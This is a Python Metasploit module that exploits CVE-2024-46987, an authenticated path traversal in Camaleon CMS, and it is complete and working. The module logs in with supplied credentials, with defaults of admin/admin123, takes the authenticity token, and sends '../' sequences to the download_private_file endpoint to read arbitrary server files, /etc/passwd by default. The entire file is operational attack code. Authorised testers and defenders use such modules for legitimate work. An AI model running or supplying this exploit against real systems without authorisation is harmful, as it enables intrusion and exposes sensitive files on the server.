#!/usr/bin/env python

# -*- coding: utf-8 -*-

# standard modules
import logging


# extra modules
dependencies_missing = False
try:
    import requests
    import re
except ImportError:
    dependencies_missing = True


from metasploit import module


metadata = {
    'name': 'Camaleon CMS Directory Traversal CVE-2024-46987',
    'description': '''
        Exploits CVE-2024-46987, an authenticated directory traversal
        vulnerability in Camaleon CMS versions <= 2.8.0 and 2.9.0
    ''',
    'authors': [
        'Peter Stockli', # Vulnerability Disclosure
        'Goultarde',     # Python Script
        'BootstrapBool'  # Metasploit Module
    ],
    'date': '2024-08-08',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': '2024-46987'},
        {
            'type': 'url',  # Advisory
            'ref': 'https://securitylab.github.com/advisories/GHSL-2024-182_GHSL-2024-186_Camaleon_CMS/'
        },
        {
            'type': 'url',  # Python Script
            'ref': 'https://github.com/Goultarde/CVE-2024-46987'
        }
    ],
    'type': 'single_scanner',
    'options': {
        'username': {
            'type': 'string',
            'description': 'Valid username',
            'required': True,
            'default': 'admin'
        },
        'password': {
            'type': 'string',
            'description': 'Valid password',
            'required': True,
            'default': 'admin123'
        },
        'filepath': {
            'type': 'string',
            'description': 'The path to the file to read',
            'required': True,
            'default': '/etc/passwd'
        },
        'depth': {
            'type': 'int',
            'description': 'Depth for path traversal',
            'required': True,
            'default': 13
        },
        'targeturi': {
            'type': 'string',
            'description': 'The URI path of the Camaleon CMS admin page',
            'required': True,
            'default': '/admin'
        },
        'vhost': {
            'type': 'string',
            'description': 'Virtual host. ex: target.com',
            'required': False,
            'default': None
        },
        'rhost': {
            'type': 'address',
            'description': 'Target address',
            'required': True,
            'default': None,
        },
        'rport': {
            'type': 'port',
            'description': 'Target port number',
            'required': True,
            'default': 80,
        },
        'ssl': {
            'type': 'bool',
            'description': 'Set SSL/TLS based connection',
            'required': True,
            'default': False
        },
        'verbose': {
            'type': 'bool',
            'description': 'Get verbose output',
            'required': False,
            'default': False
        }
    }
}


def log_debug(verbose, debug):
    if verbose == "true":
        logging.debug(debug)


def handle_url_args(args):
    if args['ssl'] == "false":
        base_url = 'http://{}:{}{}'.format(args.get('vhost') or args['rhost'], args['rport'], args['targeturi'])

    else:
        base_url = 'https://{}:{}{}'.format(args.get('vhost') or args['rhost'], args['rport'], args['targeturi'])

    if args['targeturi'].endswith('/'):
        login_url = '{}login/'.format(base_url)
        lfi_url = '{}media/download_private_file'.format(base_url)
    else:
        login_url = '{}/login/'.format(base_url)
        lfi_url = '{}/media/download_private_file'.format(base_url)

    return login_url, lfi_url


def get_token(args, session, login_url):

    r = session.get(login_url)
    
    log_debug(args['verbose'], 'Response body {}'.format(r.text))

    match = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)

    return match.group(1) if match else None


def login(args, session, login_url):
    log_debug(args['verbose'], 'Retrieving token from {}'.format(login_url))

    token = get_token(args, session, login_url)

    if not token:
        logging.error('Failed to retrieve token')
        return False
    
    log_debug(args['verbose'], 'Retrieved token {}'.format(token))

    data = {
        'authenticity_token': token,
        'user[username]': args['username'],
        'user[password]': args['password']
    }

    log_debug(args['verbose'], 'Authenticating to {}'.format(login_url))

    r = session.post(login_url, data=data, allow_redirects=True)

    return 'logout' in r.text.lower()


def read_file(args, session, lfi_url):
    traversal = '../' * int(args['depth'])

    if args['filepath'][0] == '/':
        file_arg = traversal[0:-1] + args['filepath']
    else:
        file_arg = traversal + args['filepath']

    params = {'file': file_arg}

    log_debug(args['verbose'], 'Attempting to retrieve file {} from {}'.format(args['filepath'], lfi_url))

    try:
        r = session.get(lfi_url, params = params)

        if r.status_code == 200:
            logging.info('\n' + r.text)

        else:
            logging.error('Failed to retrieve {}, got Status {}'.format(
                args['filepath'], r.status_code))

    except Exception as e:
        logging.error('Failed to retrieve {}'.format(args['filepath']))
        logging.error(e)


def run(args):
    module.LogHandler.setup(
        msg_prefix = '{} - '.format(args.get('vhost') or args['rhost'])
    )

    if dependencies_missing:
        logging.error('Module dependency is missing, cannot continue')
        return

    login_url, lfi_url = handle_url_args(args)

    try:
        session = requests.Session()

        if login(args, session, login_url):
            log_debug(args['verbose'], 'Authentication success')
            read_file(args, session, lfi_url)
        else:
            logging.error('Authentication failed')
    except Exception as e:
        logging.error('Exploit failed')
        logging.error(e)


if __name__ == '__main__':
    module.run(metadata, run)
